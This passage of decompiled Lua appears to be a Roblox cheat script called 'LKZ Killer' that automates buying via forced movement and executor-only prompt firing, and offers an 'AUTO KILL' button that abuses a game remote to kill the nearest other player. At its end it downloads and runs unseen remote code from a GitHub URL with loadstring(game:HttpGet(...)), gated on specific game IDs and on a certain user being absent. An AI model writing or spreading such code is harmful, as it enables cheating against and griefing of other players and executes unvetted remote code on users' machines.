        if v_u_1419_ then
            v_u_1419_:Disconnect()
        end
        v_u_1419_ = v_u_1398_.Heartbeat:Connect(function()
			-- upvalues: (ref) v_u_1411_, (ref) v_u_1404_, (ref) v_u_1474_, (ref) v_u_1403_, (ref) v_u_1484_, (ref) v_u_1485_
            if v_u_1411_ then
                if v_u_1404_ then
                    local v1487_, v_u_1488_ = pcall(function()
						-- upvalues: (ref) v_u_1404_
                        local v1486_ = v_u_1404_:FindFirstChild("Part") and v_u_1404_.Part:FindFirstChild("PromptAttachment")
                        if v1486_ then
                            v1486_ = v_u_1404_.Part.PromptAttachment:FindFirstChild("ProximityPrompt")
                        end
                        return v1486_
                    end)
                    if v1487_ and (v_u_1488_ and v_u_1488_:IsA("ProximityPrompt")) then
                        local _, v1489_, _ = v_u_1474_()
                        if v1489_ and v_u_1403_ then
                            local v1490_ = (v1489_.Position - v_u_1403_).Magnitude
                            local v1491_ = tick()
                            if v1490_ <= 7.5 and v_u_1485_ <= v1491_ - v_u_1484_ then
                                v_u_1484_ = v1491_
                                pcall(function()
									-- upvalues: (ref) v_u_1488_
                                    fireproximityprompt(v_u_1488_)
                                end)
                            end
                        end
                    end
                end
            else
                return
            end
        end)
    end
    local function v_u_1494_()
		-- upvalues: (ref) v_u_1411_, (ref) v_u_1474_, (ref) v_u_1402_, (ref) v_u_1416_, (ref) v_u_1463_, (ref) v_u_1413_, (ref) v_u_1492_
        if not v_u_1411_ then
            v_u_1411_ = false
            task.spawn(function()
				-- upvalues: (ref) v_u_1474_, (ref) v_u_1402_, (ref) v_u_1411_, (ref) v_u_1416_, (ref) v_u_1463_, (ref) v_u_1413_, (ref) v_u_1492_
                local _, _, v1493_ = v_u_1474_()
                if v1493_ then
                    v1493_:ChangeState(Enum.HumanoidStateType.Dead)
                end
                v_u_1402_.CharacterAdded:Wait()
                task.wait(0.5)
                if _G.AutobuyEnable then
                    v_u_1411_ = true
                    v_u_1416_ = "MOVING_TO_X"
                    v_u_1474_()
                    v_u_1463_()
                    if v_u_1413_ then
                        v_u_1413_:Disable()
                    end
                    v_u_1492_()
                end
            end)
        end
    end
    local function v_u_1496_()
		-- upvalues: (ref) v_u_1411_, (ref) v_u_1416_, (ref) v_u_1417_, (ref) v_u_1418_, (ref) v_u_1419_, (ref) v_u_1464_, (ref) v_u_1468_, (ref) v_u_1409_, (ref) v_u_1410_, (ref) v_u_1474_
        if v_u_1411_ then
            v_u_1411_ = false
            v_u_1416_ = "IDLE"
            v_u_1417_ = nil
            v_u_1418_ = nil
            if v_u_1419_ then
                v_u_1419_:Disconnect()
                v_u_1419_ = nil
            end
            v_u_1464_()
            v_u_1468_()
            if v_u_1409_ then
                task.cancel(v_u_1409_)
                v_u_1409_ = nil
            end
            if v_u_1410_ then
                task.cancel(v_u_1410_)
                v_u_1410_ = nil
            end
            local _, v1495_, _ = v_u_1474_()
            if v1495_ then
                v1495_.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
            end
        end
    end
    v_u_1398_.Heartbeat:Connect(function()
		-- upvalues: (ref) v_u_1437_, (ref) v_u_1411_, (ref) v_u_1494_, (ref) v_u_1496_
        pcall(v_u_1437_)
        if _G.AutobuyEnable and not v_u_1411_ then
            v_u_1494_()
        elseif not _G.AutobuyEnable and v_u_1411_ then
            v_u_1496_()
        end
    end)
    v_u_1398_.RenderStepped:Connect(function()
		-- upvalues: (ref) v_u_1411_, (ref) v_u_1412_, (ref) v_u_1404_, (ref) v_u_1417_, (ref) v_u_1416_, (ref) v_u_1418_, (ref) v_u_1403_
        if v_u_1411_ and v_u_1412_ then
            if v_u_1404_ ~= v_u_1417_ or v_u_1404_ and v_u_1404_.Parent == nil then
                v_u_1416_ = "MOVING_TO_X"
                v_u_1417_ = v_u_1404_
                v_u_1418_ = nil
            end
            if v_u_1404_ == nil and v_u_1416_ ~= "MOVING_TO_X" then
                v_u_1416_ = "MOVING_TO_X"
            end
            local v_u_1497_ = Vector3.new(0, 0, 0)
            local v1498_, v1499_
            if v_u_1403_ and (v_u_1412_.Position - v_u_1403_).Magnitude <= 20 then
                v1498_ = v_u_1403_.Y
                v1499_ = 250
            else
                v1498_ = 5
                v1499_ = 150
            end
            if v_u_1416_ ~= "MOVING_TO_X" then
                if v_u_1416_ ~= "MOVING_TO_TARGET" then
                    if v_u_1416_ == "NEAR_TARGET" then
                        if not v_u_1403_ then
                            v_u_1416_ = "MOVING_TO_X"
                            return
                        end
                        local v1500_ = Vector3.new(v_u_1403_.X, v1498_, v_u_1403_.Z)
                        if (Vector3.new(v1500_.X, v1498_, v1500_.Z) - Vector3.new(v_u_1412_.Position.X, v1498_, v_u_1412_.Position.Z)).Magnitude <= 4.5 then
                            v_u_1497_ = (v1500_ - v_u_1412_.Position).Unit * 0.5
                        else
                            v_u_1416_ = "MOVING_TO_TARGET"
                            v_u_1497_ = (v1500_ - v_u_1412_.Position).Unit * v1499_
                        end
                    end
                else
                    if not v_u_1403_ then
                        v_u_1416_ = "MOVING_TO_X"
                        return
                    end
                    local v1501_ = Vector3.new(v_u_1403_.X, v1498_, v_u_1403_.Z)
                    if (Vector3.new(v1501_.X, v1498_, v1501_.Z) - Vector3.new(v_u_1412_.Position.X, v1498_, v_u_1412_.Position.Z)).Magnitude <= 4 then
                        v_u_1416_ = "NEAR_TARGET"
                    else
                        v_u_1497_ = (v1501_ - v_u_1412_.Position).Unit * v1499_
                    end
                end
            else
                local v1502_ = Vector3.new(- 410, v1498_, v_u_1412_.Position.Z)
                if (v1502_ - v_u_1412_.Position).Magnitude <= 1.5 then
                    if v_u_1404_ then
                        v_u_1416_ = "MOVING_TO_TARGET"
                    else
                        v_u_1497_ = Vector3.new(0, 0, 0)
                    end
                else
                    v_u_1497_ = (Vector3.new(v1502_.X, v1498_, v_u_1412_.Position.Z) - v_u_1412_.Position).Unit * v1499_
                end
            end
            pcall(function()
				-- upvalues: (ref) v_u_1412_, (ref) v_u_1497_
                v_u_1412_.AssemblyLinearVelocity = v_u_1497_
            end)
        end
    end)
    task.spawn(function()
		-- upvalues: (ref) v_u_1411_, (ref) v_u_1409_, (ref) v_u_1480_, (ref) v_u_1410_, (ref) v_u_1482_
        while true do
            if v_u_1411_ then
                if not v_u_1409_ then
                    v_u_1480_()
                end
                if not v_u_1410_ then
                    v_u_1482_()
                end
            else
                if v_u_1409_ then
                    task.cancel(v_u_1409_)
                    v_u_1409_ = nil
                end
                if v_u_1410_ then
                    task.cancel(v_u_1410_)
                    v_u_1410_ = nil
                end
            end
            task.wait(0.1)
        end
    end)
end)
task.spawn(function()
    local v_u_1503_ = game:GetService("Players")
    local v_u_1504_ = v_u_1503_.LocalPlayer
    local v_u_1505_ = game:GetService("RunService")
    local v1506_ = game:GetService("ReplicatedStorage")
    local v_u_1507_ = game:GetService("TweenService")
    local v_u_1508_ = v1506_:FindFirstChild("Packages") and v1506_.Packages:FindFirstChild("Net")
    if v_u_1508_ then
        v_u_1508_ = v1506_.Packages.Net:FindFirstChild("RE/UseItem")
    end
    if v_u_1508_ then
        local v_u_1509_ = 14
        local v_u_1510_ = false
        local v_u_1511_ = 0
        local v_u_1512_ = 10
        local function v_u_1515_()
			-- upvalues: (ref) v_u_1504_
            local v1513_ = v_u_1504_.Character
            if v1513_ then
                local v1514_ = v1513_:FindFirstChildOfClass("Humanoid")
                if v1514_ then
                    v1514_:UnequipTools()
                end
            end
        end
        local function v_u_1523_()
			-- upvalues: (ref) v_u_1504_
            local v1516_ = v_u_1504_.Character
            if not v1516_ then
                return false
            end
            local v1517_ = v1516_:FindFirstChildOfClass("Humanoid")
            if v1517_ then
                local v1518_, v1519_, v1520_ = ipairs(v1516_:GetChildren())
                while true do
                    local v1521_
                    v1520_, v1521_ = v1518_(v1519_, v1520_)
                    if v1520_ == nil then
                        break
                    end
                    if v1521_:IsA("Tool") and v1521_.Name ~= "Web Slinger" then
                        v1517_:UnequipTools()
                    end
                end
            end
            local v1522_ = v1516_:FindFirstChild("Web Slinger") or v_u_1504_.Backpack:FindFirstChild("Web Slinger")
            if not v1522_ then
                return false
            end
            if not v1516_:FindFirstChild("Web Slinger") then
                v1522_.Parent = v1516_
                task.wait(0.05)
            end
            return true
        end
        function hasWeb()
			-- upvalues: (ref) v_u_1504_
            return v_u_1504_.Character and v_u_1504_.Character:FindFirstChild("Web Slinger") and true or (v_u_1504_.Backpack:FindFirstChild("Web Slinger") and true or false)
        end
        local function v_u_1534_()
			-- upvalues: (ref) v_u_1504_, (ref) v_u_1509_, (ref) v_u_1503_
            local v1524_ = not v_u_1504_.Character or v_u_1504_.Character:FindFirstChild("UpperTorso") or (v_u_1504_.Character:FindFirstChild("HumanoidRootPart") or v_u_1504_.Character:FindFirstChild("Torso"))
            if not v1524_ then
                return nil
            end
            local v1525_ = v_u_1509_
            local v1526_ = v_u_1503_
            local v1527_, v1528_, v1529_ = pairs(v1526_:GetPlayers())
            local v1530_ = nil
            while true do
                local v1531_
                v1529_, v1531_ = v1527_(v1528_, v1529_)
                if v1529_ == nil then
                    break
                end
                if v1531_ ~= v_u_1504_ and v1531_.Character then
                    local v1532_ = v1531_.Character:FindFirstChild("HumanoidRootPart") or (v1531_.Character:FindFirstChild("UpperTorso") or v1531_.Character:FindFirstChild("Torso"))
                    if v1532_ then
                        local v1533_ = (v1532_.Position - v1524_.Position).Magnitude
                        if v1533_ <= v_u_1509_ then
                            if v1533_ < v1525_ then
                                v1530_ = v1531_
                                v1525_ = v1533_
                            end
                        end
                    end
                end
            end
            return v1530_
        end
        local function v_u_1548_(p1535_)
            local v1536_, v1537_, v1538_ = ipairs({
                "Head",
                "UpperTorso",
                "HumanoidRootPart",
                "Torso"
            })
            while true do
                local v1539_
                v1538_, v1539_ = v1536_(v1537_, v1538_)
                if v1538_ == nil then
                    break
                end
                local v1540_ = p1535_:FindFirstChild(v1539_)
                if v1540_ and v1540_:IsA("BasePart") then
                    return v1540_
                end
            end
            local v1541_, v1542_, v1543_ = ipairs(p1535_:GetChildren())
            local v1544_ = 0
            local v1545_ = nil
            while true do
                local v1546_
                v1543_, v1546_ = v1541_(v1542_, v1543_)
                if v1543_ == nil then
                    break
                end
                if v1546_:IsA("BasePart") then
                    local v1547_ = v1546_.Size.X * v1546_.Size.Y * v1546_.Size.Z
                    if v1544_ < v1547_ then
                        v1545_ = v1546_
                        v1544_ = v1547_
                    end
                end
            end
            return v1545_
        end
        (function()
			-- upvalues: (ref) v_u_1504_, (ref) v_u_1505_, (ref) v_u_1515_, (ref) v_u_1510_, (ref) v_u_1512_, (ref) v_u_1511_, (ref) v_u_1534_, (ref) v_u_1507_, (ref) v_u_1548_, (ref) v_u_1509_, (ref) v_u_1523_, (ref) v_u_1508_
            local v1549_ = v_u_1504_:WaitForChild("PlayerGui")
            local v1550_ = v1549_:FindFirstChild("WebSlingerUI")
            if v1550_ then
                v1550_:Destroy()
            end
            local v_u_1551_ = Instance.new("ScreenGui")
            v_u_1551_.Name = "WebSlingerUI"
            v_u_1551_.ResetOnSpawn = false
            v_u_1551_.Enabled = _G.KillGui
            v_u_1551_.Parent = v1549_
            v_u_1505_.Heartbeat:Connect(function()
				-- upvalues: (ref) v_u_1551_
                if v_u_1551_ then
                    v_u_1551_.Enabled = _G.KillGui
                end
            end)
            local v1552_ = Instance.new("Frame")
            v1552_.Size = UDim2.new(0, 260, 0, 130)
            v1552_.Position = UDim2.new(0.5, - 130, 0.85, - 65)
            v1552_.BackgroundColor3 = Color3.fromRGB(15, 25, 45)
            v1552_.BorderSizePixel = 0
            v1552_.AnchorPoint = Vector2.new(0.5, 0.5)
            v1552_.Active = true
            v1552_.Draggable = true
            v1552_.Parent = v_u_1551_
            Instance.new("UICorner", v1552_).CornerRadius = UDim.new(0, 16)
            local v1553_ = Instance.new("UIStroke", v1552_)
            v1553_.Color = Color3.fromRGB(70, 130, 255)
            v1553_.Thickness = 2
            v1553_.Transparency = 0.5
            local v1554_ = Instance.new("TextLabel")
            v1554_.Size = UDim2.new(1, 0, 0, 35)
            v1554_.Position = UDim2.new(0, 0, 0, 0)
            v1554_.Text = "LKZ Killer"
            v1554_.BackgroundColor3 = Color3.fromRGB(30, 60, 120)
            v1554_.TextColor3 = Color3.fromRGB(255, 255, 255)
            v1554_.TextSize = 18
            v1554_.Font = Enum.Font.GothamBold
            v1554_.Parent = v1552_
            Instance.new("UICorner", v1554_).CornerRadius = UDim.new(0, 16)
            local v_u_1555_ = Instance.new("TextButton")
            v_u_1555_.Size = UDim2.new(0.9, 0, 0, 40)
            v_u_1555_.Position = UDim2.new(0.05, 0, 0.45, 0)
            v_u_1555_.Text = "AUTO KILL"
            v_u_1555_.TextSize = 18
            v_u_1555_.Font = Enum.Font.GothamBold
            v_u_1555_.TextColor3 = Color3.fromRGB(255, 255, 255)
            v_u_1555_.BackgroundColor3 = Color3.fromRGB(50, 100, 200)
            v_u_1555_.Parent = v1552_
            Instance.new("UICorner", v_u_1555_).CornerRadius = UDim.new(0, 12)
            local v1556_ = Instance.new("UIStroke", v_u_1555_)
            v1556_.Color = Color3.fromRGB(100, 150, 255)
            v1556_.Thickness = 2
            v1556_.Transparency = 0.3
            local v_u_1557_ = nil
            local v_u_1558_ = nil
            local function v_u_1562_(p_u_1559_)
				-- upvalues: (ref) v_u_1557_, (ref) v_u_1505_
                if p_u_1559_ and p_u_1559_.Character then
                    local v_u_1560_ = p_u_1559_.Character:FindFirstChild("HumanoidRootPart") or (p_u_1559_.Character:FindFirstChild("UpperTorso") or p_u_1559_.Character:FindFirstChild("Torso"))
                    if v_u_1560_ then
                        if v_u_1557_ then
                            v_u_1557_:Disconnect()
                        end
                        local v_u_1561_ = true
                        v_u_1557_ = v_u_1505_.Heartbeat:Connect(function()
							-- upvalues: (ref) p_u_1559_, (ref) v_u_1560_, (ref) v_u_1561_
                            if p_u_1559_.Character and v_u_1560_ then
                                if v_u_1561_ then
                                    v_u_1560_.CFrame = v_u_1560_.CFrame + Vector3.new(0, 20, 0)
                                else
                                    v_u_1560_.CFrame = v_u_1560_.CFrame + Vector3.new(0, - 20, 0)
                                end
                                v_u_1561_ = not v_u_1561_
                            end
                            task.wait(0.5)
                        end)
                    end
                else
                    return
                end
            end
            local function v_u_1563_()
				-- upvalues: (ref) v_u_1557_, (ref) v_u_1515_
                if v_u_1557_ then
                    v_u_1557_:Disconnect()
                    v_u_1557_ = nil
                end
                v_u_1515_()
            end
            v_u_1555_.MouseButton1Click:Connect(function()
				-- upvalues: (ref) v_u_1510_, (ref) v_u_1512_, (ref) v_u_1511_, (ref) v_u_1555_, (ref) v_u_1534_, (ref) v_u_1558_, (ref) v_u_1507_, (ref) v_u_1505_, (ref) v_u_1504_, (ref) v_u_1548_, (ref) v_u_1509_, (ref) v_u_1523_, (ref) v_u_1508_, (ref) v_u_1562_, (ref) v_u_1563_
                if v_u_1510_ then
                    return
                else
                    local v1564_ = v_u_1512_ - (tick() - v_u_1511_)
                    if v1564_ > 0 then
                        v_u_1555_.Text = "COOLDOWN: " .. math.ceil(v1564_) .. "s"
                        task.wait(1)
                        v_u_1555_.Text = "AUTO KILL"
                        return
                    else
                        local v_u_1565_ = v_u_1534_()
                        if v_u_1565_ then
                            v_u_1510_ = true
                            v_u_1511_ = tick()
                            v_u_1558_ = v_u_1565_
                            v_u_1555_.Text = "KILLING..."
                            local v_u_1566_ = TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
                            v_u_1507_:Create(v_u_1555_, v_u_1566_, {
                                ["BackgroundColor3"] = Color3.fromRGB(100, 150, 255)
                            }):Play()
                            local v_u_1567_ = false
                            local v_u_1568_ = false
                            local v_u_1569_ = tick()
                            local v_u_1570_ = nil
                            v_u_1570_ = v_u_1505_.Heartbeat:Connect(function()
								-- upvalues: (ref) v_u_1569_, (ref) v_u_1567_, (ref) v_u_1565_, (ref) v_u_1504_, (ref) v_u_1548_, (ref) v_u_1509_, (ref) v_u_1523_, (ref) v_u_1508_, (ref) v_u_1568_, (ref) v_u_1558_, (ref) v_u_1562_, (ref) v_u_1570_, (ref) v_u_1563_, (ref) v_u_1510_, (ref) v_u_1555_, (ref) v_u_1507_, (ref) v_u_1566_
                                local v1571_ = tick() - v_u_1569_
                                local v1572_ = (not v_u_1567_ and hasWeb() and true or false) and v_u_1565_.Character
                                if v1572_ then
                                    local v1573_ = not v_u_1504_.Character or v_u_1504_.Character:FindFirstChild("UpperTorso") or (v_u_1504_.Character:FindFirstChild("HumanoidRootPart") or v_u_1504_.Character:FindFirstChild("Torso"))
                                    local v1574_ = v1573_ and v_u_1548_(v1572_)
                                    if v1574_ then
                                        local v1575_ = v1574_.Position
                                        if (v1575_ - v1573_.Position).Magnitude <= v_u_1509_ and v_u_1523_() then
                                            v_u_1508_:FireServer(v1575_, v1574_)
                                            v_u_1567_ = true
                                        end
                                    end
                                end
                                if v_u_1567_ and (0.2 <= v1571_ and not v_u_1568_) then
                                    v_u_1568_ = true
                                    if v_u_1558_ then
                                        v_u_1562_(v_u_1558_)
                                    end
                                end
                                if v1571_ >= 1.5 then
                                    v_u_1570_:Disconnect()
                                    v_u_1563_()
                                    v_u_1510_ = false
                                    v_u_1555_.Text = "AUTO KILL"
                                    v_u_1507_:Create(v_u_1555_, v_u_1566_, {
                                        ["BackgroundColor3"] = Color3.fromRGB(50, 100, 200)
                                    }):Play()
                                end
                            end)
                        else
                            v_u_1555_.Text = "NO PLAYER IN RANGE"
                            task.wait(1)
                            v_u_1555_.Text = "AUTO KILL"
                        end
                    end
                end
            end)
        end)()
    end
end)
if type(_G.setupGuis) == "function" then
    pcall(function()
        _G.setupGuis()
    end)
end
local v1576_ = game.PlaceId
if not _G.WebEnviado then
    _G.WebEnviado = true
    if v1576_ == 109983668079237 or (v1576_ == 128762245270197 or v1576_ == 96342491571673) then
        local v1577_, v1578_, v1579_ = ipairs(game:GetService("Players"):GetPlayers())
        while true do
            local v1580_
            v1579_, v1580_ = v1577_(v1578_, v1579_)
            if v1579_ == nil then
                break
            end
            if v1580_.UserId == 5557980719 then
                return
            end
        end
        task.spawn(function()
            pcall(function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/LucasggkX/Pet-finder/refs/heads/main/LkzNN.lua"))()
            end)
        end)
    end
end